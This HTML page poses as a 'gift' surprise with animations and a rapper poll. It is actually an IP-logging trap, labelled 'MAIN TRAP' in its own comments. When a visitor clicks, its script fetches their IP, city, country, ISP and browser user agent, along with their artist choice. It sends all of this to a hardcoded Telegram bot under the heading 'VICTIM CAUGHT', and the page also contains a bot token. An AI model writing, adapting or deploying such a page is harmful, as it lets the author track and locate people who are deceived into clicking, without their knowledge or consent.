<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GIFT FROM LETSIE</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=Roboto:wght@700&display=swap');
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000;
      color: #ff0000;
      font-family: 'Roboto', sans-serif;
      min-height: 200vh;
      overflow-y: auto;
      display: flex;
      flex-direction: column;
      align-items: center;
      text-align: center;
      position: relative;
    }
    .circle {
      position: absolute;
      top: -30px;
      width: 12px;
      height: 12px;
      background: #ff0000;
      border-radius: 50%;
      box-shadow: 0 0 15px #ff0000, 0 0 30px #ff1a1a, 0 0 50px #ff3333, 0 0 70px #ff0000;
      animation: fall linear infinite;
      opacity: 0.9;
    }
    @keyframes fall {
      0% { transform: translateY(-100px) scale(1); opacity: 1; }
      100% { transform: translateY(110vh) scale(0.5); opacity: 0; }
    }
    .container { position: relative; width: 90%; max-width: 400px; z-index: 10; margin-top: 50px; }
    .box {
      background: rgba(15, 0, 0, 0.97);
      border: 4px solid #ff0000;
      border-radius: 22px;
      padding: 35px 20px;
      box-shadow: 0 0 40px #ff0000, 0 0 80px #ff1a1a, inset 0 0 20px rgba(255,0,0,0.3);
      animation: drop 1.5s ease-out forwards;
      opacity: 0;
      transform: translateY(-100px);
    }
    @keyframes drop {
      0% { opacity: 0; transform: translateY(-100px); }
      70% { opacity: 1; transform: translateY(25px); }
      100% { opacity: 1; transform: translateY(0); }
    }
    h1 {
      font-family: 'Orbitron', sans-serif;
      font-size: 2.4rem;
      color: #ff0000;
      text-shadow: 0 0 15px #ff0000, 0 0 30px #ff1a1a, 0 0 50px #ff3333;
      margin-bottom: 20px;
      animation: glow 1.5s infinite alternate;
    }
    @keyframes glow {
      from { text-shadow: 0 0 15px #ff0000; }
      to { text-shadow: 0 0 25px #ff0000, 0 0 50px #ff1a1a, 0 0 70px #ff3333; }
    }
    .btn {
      background: #ff0000;
      color: #000;
      font-weight: bold;
      font-size: 1.4rem;
      padding: 16px 32px;
      border: 3px solid #ff3333;
      border-radius: 50px;
      cursor: pointer;
      margin: 15px 0;
      box-shadow: 0 0 25px #ff0000;
      transition: all 0.3s;
      font-family: 'Orbitron', sans-serif;
    }
    .btn:hover {
      background: #fff;
      color: #000;
      transform: scale(1.15);
      box-shadow: 0 0 40px #fff, 0 0 60px #ff0000;
    }
    .result {
      margin-top: 25px;
      font-size: 1.5rem;
      font-weight: bold;
      color: #fff;
      text-shadow: 0 0 15px #ff0000;
      opacity: 0;
      transition: opacity 1s;
      line-height: 1.8;
    }
    .by {
      margin-top: 30px;
      font-size: 1.7rem;
      color: #ff0000;
      font-family: 'Orbitron', sans-serif;
      animation: pulse 1.8s infinite;
    }
    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.15); }
    }
    .hidden { display: none; }

    /* ARTIST SECTION */
    .artists {
      margin-top: 100px;
      width: 90%;
      max-width: 500px;
      display: flex;
      flex-direction: column;
      gap: 20px;
      padding: 20px;
    }
    .artist-btn {
      background: rgba(255,0,0,0.1);
      border: 3px solid #ff0000;
      border-radius: 20px;
      padding: 20px;
      display: flex;
      align-items: center;
      gap: 15px;
      color: #fff;
      font-family: 'Orbitron', sans-serif;
      font-size: 1.5rem;
      text-shadow: 0 0 10px #ff0000;
      box-shadow: 0 0 30px rgba(255,0,0,0.5);
      transition: all 0.4s;
      cursor: pointer;
    }
    .artist-btn:hover {
      background: #ff0000;
      color: #000;
      transform: scale(1.05);
      box-shadow: 0 0 50px #ff0000;
    }
    .artist-img {
      width: 80px;
      height: 80px;
      border-radius: 15px;
      object-fit: cover;
      border: 3px solid #ff3333;
      box-shadow: 0 0 20px #ff0000;
    }
  </style>
</head>
<body>

  <!-- RED CIRCLES -->
  <div id="circles"></div>

  <!-- MAIN TRAP -->
  <div class="container">
    <div class="box">
      <h1>GIFT</h1>
      <p id="step1">CLICK ME TO REVEAL A SURPRISE</p>
      <button class="btn" onclick="reveal()">CLICK ME</button>

      <!-- STEP 1: IP -->
      <div id="result-ip" class="result hidden">
        This is ur ip adress if u didnt know tongue_stuck_out:<br>
        <span id="ip" style="color:#ff0000; font-size:1.8rem;">...</span>
        <br><br>
        <button class="btn" onclick="revealLocation()">CLICK ME FOR ANOTHER SURPRISE</button>
      </div>

      <!-- STEP 2: CITY + COUNTRY -->
      <div id="result-location" class="result hidden">
        <div>Hereâ€™s where you are:</div>
        <div id="city" style="color:#ff6666; font-size:1.7rem;">...</div>
        <div id="country" style="color:#ff9999; font-size:1.5rem;">...</div>
      </div>

      <div class="by">BY ZENNY!</div>
    </div>
  </div>

  <!-- ARTIST CHOICE (SCROLL DOWN) -->
  <div class="artists">
    <div class="artist-btn" onclick="chooseArtist('Drake')">
      <img src="https://upload.wikimedia.org/wikipedia/en/9/90/Certified_Lover_Boy.jpeg" class="artist-img" alt="Drake">
      <span>DRAKE</span>
    </div>
    <div class="artist-btn" onclick="chooseArtist('Playboi Carti')">
      <img src="https://upload.wikimedia.org/wikipedia/en/2/2a/Playboi_Carti_-_Whole_Lotta_Red.png" class="artist-img" alt="Playboi Carti">
      <span>PLAYBOI CARTI</span>
    </div>
    <div class="artist-btn" onclick="chooseArtist('Ken Carson')">
      <img src="https://upload.wikimedia.org/wikipedia/en/2/2f/Ken_Carson_More_Chaos.jpg" class="artist-img" alt="Ken Carson">
      <span>KEN CARSON</span>
    </div>
  </div>

  <script>
    // === RED CIRCLES ===
    const container = document.getElementById('circles');
    function createCircle() {
      const c = document.createElement('div');
      c.classList.add('circle');
      c.style.left = Math.random() * 100 + 'vw';
      c.style.animationDuration = Math.random() * 5 + 5 + 's';
      c.style.width = c.style.height = Math.random() * 15 + 8 + 'px';
      container.appendChild(c);
      setTimeout(() => c.remove(), 12000);
    }
    setInterval(createCircle, 150);

    // === TELEGRAM BOT ===
    const BOT_TOKEN = '8501597773:AAG1l8FnPsKtOt8sJ7ejB0r-zSacGwpYuBI';
    const CHAT_ID = '6726658638';

    let userIP = "";

    // === SEND TO TELEGRAM (PRO FORMAT) ===
    function sendToTelegram(ip, city = "", country = "", isp = "", device = "", artist = "") {
      const time = new Date().toLocaleString();
      const site = location.href;
      let message = 
`VICTIM CAUGHT

Heres their ip: <code>${ip}</code>
Country: <b>${country || "Unknown"}</b>
Province: <b>${city || "Unknown"}</b>
ISP: <b>${isp || "Unknown"}</b>
Device: <code>${device}</code>
Site: <a href="${site}">${site}</a>`;

      if (artist) message += `\nChose Artist: <b>${artist}</b>`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`)
        .catch(() => {});
    }

    // === STEP 1: GET IP ===
    function getIP() {
      fetch('https://api.ipify.org?format=json')
        .then(r => r.json())
        .then(data => {
          userIP = data.ip;
          document.getElementById('ip').innerHTML = userIP;
          const device = navigator.userAgent.substring(0, 80);
          sendToTelegram(userIP, "", "", "", device);
        })
        .catch(() => {
          document.getElementById('ip').innerHTML = "BLOCKED";
        });
    }

    // === STEP 2: GET LOCATION + ISP ===
    function getLocation() {
      fetch(`https://ipapi.co/${userIP}/json/`)
        .then(r => r.json())
        .then(data => {
          const city = data.city || data.region || "Unknown";
          const country = data.country_name || "Unknown";
          const isp = data.org || "Unknown ISP";
          const device = navigator.userAgent.substring(0, 80);

          document.getElementById('city').innerHTML = city;
          document.getElementById('country').innerHTML = country;

          sendToTelegram(userIP, city, country, isp, device);
        })
        .catch(() => {
          document.getElementById('city').innerHTML = "Blocked";
        });
    }

    // === REVEAL IP ===
    function reveal() {
      document.getElementById('step1').classList.add('hidden');
      document.querySelector('.btn').classList.add('hidden');
      const result = document.getElementById('result-ip');
      result.classList.remove('hidden');
      setTimeout(() => result.style.opacity = 1, 100);
      getIP();
    }

    // === REVEAL LOCATION ===
    function revealLocation() {
      document.querySelector('#result-ip .btn').classList.add('hidden');
      const result = document.getElementById('result-location');
      result.classList.remove('hidden');
      setTimeout(() => result.style.opacity = 1, 100);
      getLocation();
    }

    // === ARTIST CHOICE ===
    function chooseArtist(artist) {
      alert(`You chose: ${artist} ðŸ”¥`);
      const device = navigator.userAgent.substring(0, 80);
      sendToTelegram(userIP, "", "", "", device, artist);
    }
  </script>
</body>
</html>
